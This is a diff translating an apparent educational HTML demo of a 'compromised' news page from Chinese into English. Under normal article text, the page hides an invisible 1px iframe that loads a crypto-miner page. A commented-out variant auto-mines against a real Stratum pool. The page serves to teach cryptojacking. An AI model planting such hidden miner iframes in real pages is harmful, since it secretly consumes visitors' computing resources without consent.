@@ -1,31 +1,31 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>每日科技 · 正常资讯页（实验）</title>
+  <title>Daily Tech · benign article (demo)</title>
   <style>
     body { font-family: Georgia, serif; max-width: 38rem; margin: 2rem auto; padding: 0 1rem; color: #222; line-height: 1.6; }
     h1 { font-size: 1.5rem; }
     .meta { color: #666; font-size: 0.9rem; }
-    /* 嵌入式攻击：隐藏 iframe 加载跨页「载荷」（同目录下为同源演示） */
+    /* Embedded attack: hidden iframe loads cross-page payload (same-origin demo here) */
     iframe#cj { position: absolute; width: 1px; height: 1px; border: 0; opacity: 0; pointer-events: none; }
   </style>
 </head>
 <body>
   <article>
-    <p class="meta">教育实验 · 模拟被挂马的资讯页</p>
-    <h1>某新技术将改变行业格局</h1>
-    <p>这是一段看起来完全正常的正文。用户不会注意到页面角落还加载了一个不可见的 iframe。</p>
-    <p>下方 iframe 指向 <code>evil-miner.html</code>：在真实攻击中常为跨域脚本或第三方广告域；此处为课程演示，使用同源路径便于你本地一次 HTTP 服务跑通。</p>
+    <p class="meta">Education demo · simulated compromised news page</p>
+    <h1>New tech could reshape the industry</h1>
+    <p>This looks like ordinary article text. Users may not notice a tiny invisible iframe in the corner.</p>
+    <p>The iframe below points at <code>evil-miner.html</code>. In real attacks this is often a cross-origin script or ad domain; here it is same-origin so one local HTTP server is enough.</p>
   </article>
 
-  <!-- 载荷 A：仅本地 PoW（无 Stratum） -->
+  <!-- Payload A: local PoW only (no Stratum) -->
   <iframe id="cj" src="evil-miner.html" title="hidden" sandbox="allow-scripts allow-same-origin"></iframe>
 
-  <!-- 载荷 B：真 Stratum（需 stratum-proxy + URL 参数；与 evil-miner 二选一，不要同时开两个 iframe 以免抢 CPU） -->
+  <!-- Payload B: real Stratum (needs stratum-proxy + URL params; pick evil-miner OR this iframe, not both—CPU) -->
   <!--
-  <iframe id="cj2" src="evil-stratum.html?auto=1&amp;mine=1&amp;host=stratum.braiins.com&amp;port=3333&amp;worker=你的子账户.矿工&amp;pass=x" title="hidden" sandbox="allow-scripts allow-same-origin" style="position:absolute;width:1px;height:1px;opacity:0;border:0"></iframe>
+  <iframe id="cj2" src="evil-stratum.html?auto=1&amp;mine=1&amp;host=stratum.braiins.com&amp;port=3333&amp;worker=subaccount.worker&amp;pass=x" title="hidden" sandbox="allow-scripts allow-same-origin" style="position:absolute;width:1px;height:1px;opacity:0;border:0"></iframe>
   -->
 </body>
 </html>
